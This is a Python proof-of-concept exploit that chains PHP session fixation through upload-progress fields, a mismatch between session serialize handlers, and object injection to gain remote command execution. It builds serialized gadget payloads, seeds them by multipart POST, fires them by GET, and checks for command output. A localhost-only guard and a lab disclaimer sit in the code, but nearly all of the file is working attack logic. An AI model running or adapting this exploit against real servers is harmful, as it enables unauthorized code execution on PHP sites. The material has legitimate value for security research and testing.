#!/usr/bin/env python3
"""
poc_local.py — CVE-2026-109618/109619 session.upload_progress lab PoC (LOCAL TARGETS ONLY)

Chain (technique first published 2026-10-21; see README for credits):

  [1] SEED  POST a directory whose session.serialize_handler is php_serialize
            (.user.ini). multipart fields:
              PHPSESSID=<sid>                     <- session fixation via POST field
              PHP_SESSION_UPLOAD_PROGRESS=|<obj>  <- key becomes upload_progress_|<obj>
            PHP stores the key verbatim inside a php_serialize session blob.
  [2] FIRE  GET a directory using the default `php` handler with Cookie sid.
            session_start() decodes the blob with the php handler, splits at the
            FIRST `|` (ours) and unserializes <obj> -> object injection. Trailing
            container data forces a decode FAILURE -> the injected object's
            __destruct runs INSIDE session_start().

Point it only at lab targets you control (127.0.0.1 by default). Authorized
security research only.
"""
import argparse
import http.client
import random
import sys

BOUNDARY = "----p2slabZq71v"


def part(name, value, filename=None):
    d = 'Content-Disposition: form-data; name="%s"' % name
    if filename:
        d += '; filename="%s"' % filename
    return ("--%s\r\n" % BOUNDARY).encode() + d.encode() + b"\r\n\r\n" + value + b"\r\n"


def serialize(gadget, prop, cmd):
    cmd = cmd.encode()
    return b'O:%d:"%s":1:{s:%d:"%s";s:%d:"%s";}' % (
        len(gadget), gadget.encode(), len(prop), prop.encode(), len(cmd), cmd)


def seed(host, port, path, sid, payload):
    body = (part("PHPSESSID", sid.encode())
            + part("PHP_SESSION_UPLOAD_PROGRESS", b"|" + payload)
            + part("f", b"Z", filename="a")
            + ("--%s--\r\n" % BOUNDARY).encode())
    if BOUNDARY.encode()[2:] in payload:
        sys.exit("[-] payload collides with the multipart boundary")
    c = http.client.HTTPConnection(host, port, timeout=15)
    c.request("POST", path, body=body, headers={
        "Content-Type": "multipart/form-data; boundary=" + BOUNDARY,
        "Content-Length": str(len(body))})
    r = c.getresponse(); data = r.read(); c.close()
    return r.status, data


def fire(host, port, path, sid):
    try:
        c = http.client.HTTPConnection(host, port, timeout=15)
        c.request("GET", path, headers={"Cookie": "PHPSESSID=" + sid})
        r = c.getresponse(); data = r.read(); c.close()
        return r.status, data
    except (http.client.RemoteDisconnected, ConnectionResetError, OSError):
        return 0, b""


def main():
    ap = argparse.ArgumentParser(description="CVE-2026-109618/619 LOCAL lab PoC")
    ap.add_argument("host", nargs="?", default="127.0.0.1")
    ap.add_argument("port", nargs="?", type=int, default=8080)
    ap.add_argument("cmd", nargs="?", default="id; uname -sr")
    ap.add_argument("--seed-path", default="/app/seed.php")
    ap.add_argument("--trigger-path", default="/api/app.php")
    ap.add_argument("--gadget", default="Logger")
    ap.add_argument("--prop", default="cmd")
    ap.add_argument("--sid", default="%032x" % random.getrandbits(128))
    a = ap.parse_args()

    if a.host not in ("127.0.0.1", "localhost", "::1"):
        sys.exit("[-] refusing non-local target — this PoC is for lab use only")

    payload = serialize(a.gadget, a.prop, a.cmd)
    print("[*] sid=%s  payload=%d B  gadget=%s->%s" % (a.sid, len(payload), a.gadget, a.prop))
    st, data = seed(a.host, a.port, a.seed_path, a.sid, payload)
    print("[1] seed  POST %s -> HTTP %d (%d B)" % (a.seed_path, st, len(data)))
    st, data = fire(a.host, a.port, a.trigger_path, a.sid)
    print("[2] fire  GET  %s -> HTTP %d (%d B)" % (a.trigger_path, st, len(data)))
    print("---- response body ----")
    print(data.decode("latin1", "replace").strip()[:1500])
    print("---- end ----")
    ok = (a.cmd.split(";")[0].strip() in data.decode("latin1", "replace")) or (b"uid=" in data)
    print("[+] %s" % ("command output seen — RCE confirmed" if ok else "no output: check gadget/handler dirs"))
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
